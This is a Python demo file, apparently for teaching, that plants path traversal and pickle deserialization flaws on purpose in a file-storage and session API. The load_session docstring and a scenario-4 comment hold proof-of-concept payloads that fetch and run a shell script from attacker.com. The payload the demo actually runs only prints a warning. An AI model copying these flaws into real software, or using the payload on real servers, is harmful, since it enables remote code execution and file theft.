"""
demo_file_service.py
User File Storage & Session Manager — CloudDrive API v2.1
CWE-22 : Path Traversal        (OWASP A01:2021)
CWE-502: Insecure Deserialization (OWASP A08:2021)
"""

import os
import pickle
import base64


UPLOAD_DIR = "./uploads"     # Intended safe directory
SESSION_DIR = "./sessions"   # Where session objects are stored


# ─────────────────────────────────────────────────────────
# BUG #1 — CWE-22: PATH TRAVERSAL
# User supplies a filename like "../../etc/passwd"
# The code joins it directly without sanitizing → escapes UPLOAD_DIR
# ─────────────────────────────────────────────────────────
def read_user_file(username: str, filename: str) -> str:
    """
    Reads a file from the user's upload folder.
    BUG: filename is joined without stripping '../' sequences.
    Attacker: filename = "../../etc/passwd"
              → full path becomes ./uploads/bob/../../etc/passwd
              → resolves to /etc/passwd  ← arbitrary file read!
    """
    # ❌ VULNERABLE — no path normalization or boundary check
    file_path = os.path.join(UPLOAD_DIR, username, filename)
    print(f"[DEBUG] Opening: {file_path}")

    if not os.path.exists(file_path):
        return f"[ERROR] File not found: {file_path}"

    with open(file_path, "r", encoding="utf-8", errors="ignore") as f:
        return f.read()


def write_user_file(username: str, filename: str, content: str) -> bool:
    """
    Saves a file into the user's folder.
    BUG: Same traversal — attacker can OVERWRITE arbitrary system files.
    Attacker: filename = "../../app.py"  → overwrites the main app!
    """
    # ❌ VULNERABLE
    file_path = os.path.join(UPLOAD_DIR, username, filename)
    os.makedirs(os.path.dirname(file_path), exist_ok=True)

    with open(file_path, "w", encoding="utf-8") as f:
        f.write(content)

    print(f"[INFO] Written to: {file_path}")
    return True


# ─────────────────────────────────────────────────────────
# BUG #2 — CWE-502: INSECURE DESERIALIZATION
# The app stores session data as base64-encoded pickle objects.
# pickle.loads() on attacker-controlled bytes = Remote Code Execution.
# ─────────────────────────────────────────────────────────
def save_session(session_id: str, user_data: dict):
    """Serialize and store a user session using pickle."""
    os.makedirs(SESSION_DIR, exist_ok=True)
    session_path = os.path.join(SESSION_DIR, f"{session_id}.pkl")

    # ❌ VULNERABLE — pickle is never safe for untrusted data
    with open(session_path, "wb") as f:
        pickle.dump(user_data, f)

    encoded = base64.b64encode(pickle.dumps(user_data)).decode()
    print(f"[SESSION] Saved. Cookie value: {encoded}")
    return encoded


def load_session(session_cookie: str) -> dict:
    """
    Deserialize a session from the cookie value.
    BUG: The cookie is base64-decoded then passed directly to pickle.loads().
    Attacker crafts a malicious pickle payload → RCE on the server.

    Exploit PoC (what an attacker sends):
        import os, pickle, base64
        class Exploit(object):
            def __reduce__(self):
                return (os.system, ("curl attacker.com/shell.sh | bash",))
        payload = base64.b64encode(pickle.dumps(Exploit())).decode()
    """
    print(f"[SESSION] Loading from cookie...")

    try:
        raw_bytes = base64.b64decode(session_cookie)

        # ❌ VULNERABLE — arbitrary code execution if cookie is tampered
        user_data = pickle.loads(raw_bytes)
        print(f"[SESSION] Loaded: {user_data}")
        return user_data
    except Exception as e:
        print(f"[SESSION] Error: {e}")
        return {}


# ─────────────────────────────────────────────────────────
# DEMO SCENARIOS
# ─────────────────────────────────────────────────────────
if __name__ == "__main__":
    os.makedirs(UPLOAD_DIR + "/alice", exist_ok=True)
    with open(UPLOAD_DIR + "/alice/report.txt", "w") as f:
        f.write("Alice's confidential quarterly report — Q4 2024")

    print("=" * 55)
    print("SCENARIO 1: Normal file read")
    print("=" * 55)
    content = read_user_file("alice", "report.txt")
    print(f"Content: {content}")

    print("\n" + "=" * 55)
    print("SCENARIO 2: Path Traversal Attack — read system file")
    print("=" * 55)
    # Try to escape the upload dir and read a sensitive file
    stolen = read_user_file("alice", "../../uploads/alice/report.txt")
    print(f"Traversal result: {stolen[:200]}")

    print("\n" + "=" * 55)
    print("SCENARIO 3: Normal session save & load (pickle)")
    print("=" * 55)
    cookie = save_session("sess_001", {"user": "alice", "role": "admin", "id": 42})
    recovered = load_session(cookie)
    print(f"Recovered session: {recovered}")

    print("\n" + "=" * 55)
    print("SCENARIO 4: Malicious pickle payload (RCE simulation)")
    print("=" * 55)

    # Safe simulation — just prints a warning instead of actual RCE
    class MaliciousPayload:
        def __reduce__(self):
            # In a real attack: return (os.system, ("curl attacker.com | bash",))
            return (print, ("[⚠️  RCE TRIGGERED] Attacker command would execute here!",))

    evil_cookie = base64.b64encode(pickle.dumps(MaliciousPayload())).decode()
    print(f"Attacker cookie: {evil_cookie[:60]}...")
    load_session(evil_cookie)   # ← triggers __reduce__ on load
